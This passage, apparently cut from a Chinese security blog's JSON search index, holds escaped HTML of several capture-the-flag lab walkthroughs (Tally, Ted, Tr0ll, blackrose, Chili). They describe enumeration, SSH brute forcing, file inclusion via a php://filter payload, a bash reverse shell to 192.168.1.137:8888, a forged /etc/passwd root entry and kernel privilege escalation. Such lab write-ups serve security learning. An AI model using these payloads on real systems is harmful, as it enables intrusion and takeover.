alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e值得关注的服务：\u003c/p\u003e\n\u003cp\u003eftp、http、smb、mysql、winrm\u003c/p\u003e\n\u003cp\u003e先看ftp:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6ed7e599ecd0488c2e86079a77b99131image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esmb：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8fe345e31db3bdb7cf273e07915c3984image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e只能看看http了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE090ee03356170ef55f38ba11bf7f2564image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e我扫了半天也没扫出东西来，看了才知道，得用其他字典:\u003c/p\u003e\n\u003cp\u003e/usr/share/wordlists/dirb/vulns/sharepoint.txt\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf0bfc009a4a3d09250fd72083120869aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这三个都可以用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7824a383e5e426d8266d5dada79e45dfimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEef34adcded028c6e4b5c310e3a0ffdcdimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现文档：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEae376517451fc4c05164c1bc4e7ac35dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有密码了，但是好像没名字\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEee5a5b5cb2e5518d45cbd75613e68974image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e先试试，但是失败了，继续信息收集，通过删除#号前面的内容，可以成功看到信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE541055b77ce347ec03309eb5d4f714a6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户名为：ftp_user，同时告诉我们一个信息，他们会定时查看htlm文件，在Intranet文件夹中，可能可以钓鱼：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6a08df7416a01876c4308183d3470cdbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现用户名：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE810f2e4a66c0c88cdad0af2af768b61bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf02fd893f94e0bf1dcac3f93def99a68image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e继续信息收集，发现一个keepass软件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE1c41a58845ab8cd87721b31604d23358image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这个软件好像是个密码保存软件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb74cb4f7fe8e5557ee0657c8fcaba253image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e并且查询后发现存储的密码是可以破解的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8949ce1edca07994e3f46dcd4b958945image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esimplementeyo    (tim)\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE41302bbc7352a378dbb7059f2d716cf1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过keepass2读取文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd79827b229c7ced20ad4c600e0997da0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewinrm登录失败了，但是成功登录了smb，说实话，东西太多了，这样增加的难度我不是很喜欢：\u003c/p\u003e\n\u003cp\u003e在zz_Archived中发现密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe5939a893170acd30b2cbc81bfbb434cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是好像不对：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe7195889aad737dab014b521ce28e36cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X038 Tally"},{"content":"端口扫描 渗透 看样子目录没扫出什么东西：\n有些时候很想要报警啊，试了半天，没想到是要大写啊：\n8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918\n文件包含：\n远程文件包含尝试：\nhttp看样子是不行的：\n但是看这个是个simple file brower，会不会是走sftp协议的：\n可惜一直不让我看源码，一看就卡住：\n得用伪协议改一下\nphp://filter/read=convert.base64-encode/resource= 弄是弄出来了，没发现可以利用的地方啊，代码审计吧：\nhome.php\nauthenticate.php\n没看懂，这里是search了存放session的文件嘛，cookie里面的user_pref值会赋值给session里面的user_pref，这个代码我看懂了：\n但是这存放session的路径哪儿来的？？难不成是默认的？后面看了一下，还真的是:\nSession的存储位置获取：一般是通过以下两种方式。\n（1）通过phpinfo的信息可以获取到Session的存储位置。phpinfo中的session.save_path存储的是Session的存放位置。通过phpinfo的信息获取到session.save_path为/var/lib/php/session。\n（2）通过猜测默认的Session存放位置进行尝试。通常Linux下Session默认存储在/var/lib/php/session目录下。默认存储Session存放位置。\n直接PHP弹shell吧：\n提权 ","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x038-ted-1--/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb3f7bb4145739ba4a03002853350e6e9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1e8b2fa9f312d6c2337739ee6e16b3ed%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e看样子目录没扫出什么东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE87c835b4b6c5df9ff9f3ea6df4f0b684%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2125052416407b515fe704f6a94753b8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有些时候很想要报警啊，试了半天，没想到是要大写啊：\u003c/p\u003e\n\u003cp\u003e8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2fd89f5e93613637d52e107deb25a455%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e文件包含：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf2a545538bb02d866f293c78d1cd2506%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e远程文件包含尝试：\u003c/p\u003e\n\u003cp\u003ehttp看样子是不行的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0d6af8fd3d324fca979a5281004ea43b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是看这个是个simple file brower，会不会是走sftp协议的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd68f52e2d8edaceec2aaf5c813357322%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e可惜一直不让我看源码，一看就卡住：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf86444f9756f6c45aaba79d4a68917f7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e得用伪协议改一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ephp://filter/read=convert.base64-encode/resource=\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE41089606fac16ce928c9500d8a7e6f35%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e弄是弄出来了，没发现可以利用的地方啊，代码审计吧：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"attachments/WEBRESOURCE0fbb1544939ce5af7e61843adabb2430home.php\"\u003ehome.php\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"attachments/WEBRESOURCE8d7d8e88879da6e5d5fd4dc185d2ec92authenticate.php\"\u003eauthenticate.php\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e没看懂，这里是search了存放session的文件嘛，cookie里面的user_pref值会赋值给session里面的user_pref，这个代码我看懂了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE881c4e3ae7dfdd1cdd76d540cdfcd048%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是这存放session的路径哪儿来的？？难不成是默认的？后面看了一下，还真的是:\u003c/p\u003e\n\u003cp\u003eSession的存储位置获取：一般是通过以下两种方式。\u003c/p\u003e\n\u003cp\u003e（1）通过\u003ca href=\"https://so.csdn.net/so/search?q=phpinfo\u0026amp;spm=1001.2101.3001.7020\"\u003ephpinfo\u003c/a\u003e的信息可以获取到Session的存储位置。phpinfo中的session.save_path存储的是Session的存放位置。通过phpinfo的信息获取到session.save_path为/var/lib/php/session。\u003c/p\u003e\n\u003cp\u003e（2）通过猜测默认的Session存放位置进行尝试。通常Linux下Session默认存储在/var/lib/php/session目录下。默认存储Session存放位置。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE45658344363bc0c1e6be9e5fbdf8bae8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e直接PHP弹shell吧：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd081e8dcab60bb05286c54d34c276fb0%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8251f9fb07cd24859ceea72ce62b4335%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE593b496994e2bfc0cd948cf6c797192f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x038 Ted 1  "},{"content":"端口扫描 渗透 这台靶机的思路比较骚，隐藏的信息也比较多：\n挨个端口看：\n21发现pacp包\n然后是pacp包的查看方式，我最开始使用的是whireshark，然后看了半天找不到重点，后面才知道可以用strings慢了来看：\n然后就可以看到路径了，由于web之前扫了半天没发现可用信息，这是个web目录：\n这个东西打开运行，看起来真的有可能是内存地址，但是实际上是个web目录，\n目录下面两个文件：\n第一个显然是用户名：\n第二个说有密码，\n然后就是SSH爆破，\n由于目标机器开了一些放爆破的设置，如果使用medusa爆破就会出现直接卡住的情况：\n如果使用hydra去爆破，不清楚是不是因为hydra速度较快还是顺序问题，就可以直接爆破成功：\n后面看了视频，最好的解决方式是crackmapexec的排除法，将已经爆破了的账户删掉，爆破剩下的账户，最后就可以排除出来合法的用户了，可能是因为crackmapexec显示的内容更加细节一些：\n可以看到前面的都是认证失败，后面的才是连接失败\n提权 很好，这个脏牛又把机器打崩了\n坑点4 会话时间很短，很容易就断了\n最后是37292这个打成功了\n[CVE-2015-1328] overlayfs\n然后是计划任务也可以提权，可以直接弹shell、\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x039-tr0ll/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0e1365685896ce51ffe42babe7a95c23%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE074facdab6002961c4303f213d488e1f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb1c0a93c44701eb73d9f2641be93d73f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e这台靶机的思路比较骚，隐藏的信息也比较多：\u003c/p\u003e\n\u003cp\u003e挨个端口看：\u003c/p\u003e\n\u003cp\u003e21发现pacp包\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEaaefaad85575ae76f21f06fb39744f2a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后是pacp包的查看方式，我最开始使用的是whireshark，然后看了半天找不到重点，后面才知道可以用strings慢了来看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0f2759b02bc89e0d72eb1005712ea5f6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后就可以看到路径了，由于web之前扫了半天没发现可用信息，这是个web目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEaec3db98de920a29654e059b0bc59a98%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这个东西打开运行，看起来真的有可能是内存地址，但是实际上是个web目录，\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEca3f8275a6aa6e1abede34ce448ffbaf%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e目录下面两个文件：\u003c/p\u003e\n\u003cp\u003e第一个显然是用户名：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc44be09bf0ebae3ebe85bcca63aaf997%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e第二个说有密码，\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8b5d2a996b1eb2c3ebac1e21aa5028aa%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后就是SSH爆破，\u003c/p\u003e\n\u003cp\u003e由于目标机器开了一些放爆破的设置，如果使用medusa爆破就会出现直接卡住的情况：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0a7eeea488f3456e12bc6076c331f5cf%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e如果使用hydra去爆破，不清楚是不是因为hydra速度较快还是顺序问题，就可以直接爆破成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1bd40110077935ee9683de62da0febc1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面看了视频，最好的解决方式是crackmapexec的排除法，将已经爆破了的账户删掉，爆破剩下的账户，最后就可以排除出来合法的用户了，可能是因为crackmapexec显示的内容更加细节一些：\u003c/p\u003e\n\u003cp\u003e可以看到前面的都是认证失败，后面的才是连接失败\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5ffae689817ccdb52da20634281aeed2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e很好，这个脏牛又把机器打崩了\u003c/p\u003e\n\u003cp\u003e坑点4 会话时间很短，很容易就断了\u003c/p\u003e\n\u003cp\u003e最后是37292这个打成功了\u003c/p\u003e\n\u003cp\u003e[CVE-2015-1328] overlayfs\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE14ed2ca3a05b7c9c84072b77dae7aae4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后是计划任务也可以提权，可以直接弹shell、\u003c/p\u003e","title":"0x039 Tr0ll"},{"content":"这次网络修复非常奇葩，记录一下:\ni=\u0026#39;\rshift 7 = /\r/ = .\rshift / = :\r= = - 端口扫描 渗透 由于没有任何凭据，直接尝试爆破，3306不允许连接，那么重点就是web了\n80渗透，扫描基本无果：\n用户名枚举，有admin账户：\n好吧，完全没有思路过后，我看了WP，目前觉得该靶机可能不太适合我，超纲了，并且后面证明这个地方校验很强，没法枚举。\n然后时隔一个月，再次打开这个靶机：\n首先是自己注册的账户，进去是没有东西的，也就是说必须要admin用户登录进去，同时也有很明显的用户名枚举，所以是可以知道用户名是admin的：\n这里的知识点是，后端采用的是\nint strcmp(string $str1, string $str2) 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 \u0026lt; 0；如果 str1 大于 str2 返回 \u0026gt; 0；\n当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将\n只要我们$_POST[‘password’]是一个\n通过拦截修改数据包就可以登录后台：\n就可以看到如下：\n然后这里有个输入框：可以执行命令：\n但是只能执行whoami，执行其他的就会提示签名错误：\n那么现在就是破解这个签名，看看这个签名写的啥，加密方式为\nbcrypt的加密网站\nhttps://www.browserling.com/tools/bcrypt\n反弹shell语句：\nbash -c \u0026lsquo;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.137/8888 0\u0026gt;\u0026amp;1\u0026rsquo;\n加密后：\n$2a$10$6Epzbo7O.fFihwK9JQ4o.Oa7DhFShfLZJCvQHvh4g7MJcm1LX5l4.\n然后直接右键审查元素，然后run即可获得shell:\n提权 so文件可以提权到delx\n然后接着看了一下，2021-4034提权成功\n回头再去看作者给的那条路吧：\n根据以往的经验，多半是计划任务或者什么文件或者目录具有修改权限，最后导致提权，我就懒得翻找了，上脚本，然后失败了，这个脚本并没有什么有用信息：\n数据库密码先收集一下，尝试后，密码没用\nhowareyoubuddy\n然后还有一个密钥，破解一下密钥的密码：\n我本来是想着拿着这个密码去试试sudo -l的，但是还是失败了，基本上没思路了，无奈看wp，下面的内容就全是看了wp才做出来的了：\nfind / -type f -user delx 2\u0026gt;/dev/null\n用这个命令帮我们找delx用户的文件：\n然后运行，貌似是要输密码的意思，由于是程序，所以可以逆向获得密码：\n反编译看一下吧：\n反编译出来的代码解释如下，其实就是个对比程序：\n这一串是aes加密的内容，其实下面的步骤就是aes逐步解密的过程，而且是有密钥的\nJqT/3t/ucYLw/dlb6c5PzmQM9lRYjuRIPgCmcHP+RTE=\n全部拖出来就是\n有了AES密钥和aes加密本身，就可以解密了：\n得到明文\nRkZiPVkvxykJVOmxBmitBPeJXqFuxM\n那么上一步获得的密码又是用来干什么的呢：\n然后接着就又是意想不到的东西了，主页的背景图片，其实仔细观察可以发现是故意隐藏了的，在css里面：\n这里面是没有图片链接的：\nimg/background-image.jpg，我只能理解为这是作者的小提示吧，但是思路确实不够连贯，有点脑洞和跳脱：\n把密码输入这里，可以看到password文件：\n然后又拿到一串密文，这又是什么加密方式呢？\ns)M8Z=7|8/\u0026amp;YY-zK5L$.w3Su\u0026rsquo;Q@nGR\n算了，邪门儿，没啥逻辑，或者说就是单纯的体力活儿，把所有的都尝试一遍？\n加密方式为ROT47，这个加密方式的特征我也搜了一下，不太好判断，一堆CTF古典密码，邪门儿得很\nDX|g+lfMg^U**\\Kzd{S]Hb$FV\u0026quot;o?v#\n根据最开始工具运行的提示，应该知道这是yourname的密码：\n第一个user.txt\n再次提权：\n然后这里我觉得又说不通了，这里是没有权限知道这个程序是干什么的，读取文件，还是读取文件再执行，没权限拿到源码，然后逆向啥的嘛，\n这里是写一个php文件，然后执行命令，有一些限制，得慢慢尝试：\necho \u0026ldquo;\u0026rdquo; \u0026gt;1.php\n再来进行代码分析，这个blackrose居然是个python 脚本：\n这里解答了我上面的疑惑，只要绕过上面的禁用名单，并且正常执行即可：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x040-blackrose-1509/","summary":"\u003cp\u003e这次网络修复非常奇葩，记录一下:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ei=\u0026#39;\r\nshift 7 = /\r\n/ = .\r\nshift / = :\r\n= = -\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3bb67d55c126a6dc667c95890ad4b4e7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE95f2a95c2d3a2e07d51ae72a2ffbb842%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa6e15676d2c085ce0b8120415e12fcb2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e由于没有任何凭据，直接尝试爆破，3306不允许连接，那么重点就是web了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdebcdbf3eaf9cb7bc3a02c29132f7a7b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80渗透，扫描基本无果：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE85fd1c89bc4d8017671da42b1274b35f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户名枚举，有admin账户：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE00d5b379aa51430af89d2b11b8fd8d02%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e好吧，完全没有思路过后，我看了WP，目前觉得该靶机可能不太适合我，超纲了，并且后面证明这个地方校验很强，没法枚举。\u003c/p\u003e\n\u003cp\u003e然后时隔一个月，再次打开这个靶机：\u003c/p\u003e\n\u003cp\u003e首先是自己注册的账户，进去是没有东西的，也就是说必须要admin用户登录进去，同时也有很明显的用户名枚举，所以是可以知道用户名是admin的：\u003c/p\u003e\n\u003cp\u003e这里的知识点是，后端采用的是\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eint strcmp(string $str1, string $str2)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 \u0026lt; 0；如果 str1 大于 str2 返回 \u0026gt; 0；\u003c/p\u003e\n\u003cp\u003e当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将\u003c/p\u003e\n\u003cp\u003e只要我们$_POST[‘password’]是一个\u003c/p\u003e\n\u003cp\u003e通过拦截修改数据包就可以登录后台：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd3f23e9ecd2b0b3fb0455edc7571813d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e就可以看到如下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE273d1293b5dedf0d364b0c85c04c86b0%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后这里有个输入框：可以执行命令：\u003c/p\u003e\n\u003cp\u003e但是只能执行whoami，执行其他的就会提示签名错误：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf0cd0356fc8973869b4d63f3f2da7715%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE584fe93e66e8821e136838991acd19d8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那么现在就是破解这个签名，看看这个签名写的啥，加密方式为\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb8f92125755cfe938fb8beadba5bbbcf%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x040 blackrose-1,509"},{"content":"端口扫描 渗透 21端口匿名登录失败吗，那就只能看80端口了：\n80端口和图片大致看了一下，没有发现隐藏信息，然后就用cewl收集了一下账户密码，但是这里有个地方没考虑到，那就是chili开头是大写，然后这里应该尝试改成小写：\n然后用hydra进行爆破即可，但是这里完了截图，爆破出来应该是a1b2c3d4:\n看到当前是chili的家目录，第一反应是写密钥，但是很可惜，可以开放ssh服务：\n从web入手，写shell吧：\n可以发现.nano目录是具有权限的，然后直接把反弹shell的php代码上传上去即可，记得给木马执行权限，直接给777：\n提权 passwd文件可写：\nchili用户是可以切换的，直接改passwd文件密码吧，密码Abcd1234\nroot:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash ","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x041-chili/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEeeadc90a6640f73b17281a4e92454ff3%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9ca1efef375b765dfd3179dcc8f00fbe%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcca80187dba627272593584d5f1ca45d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e21端口匿名登录失败吗，那就只能看80端口了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE314b058a81141db97eae8b02efe157fe%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口和图片大致看了一下，没有发现隐藏信息，然后就用cewl收集了一下账户密码，但是这里有个地方没考虑到，那就是chili开头是大写，然后这里应该尝试改成小写：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" 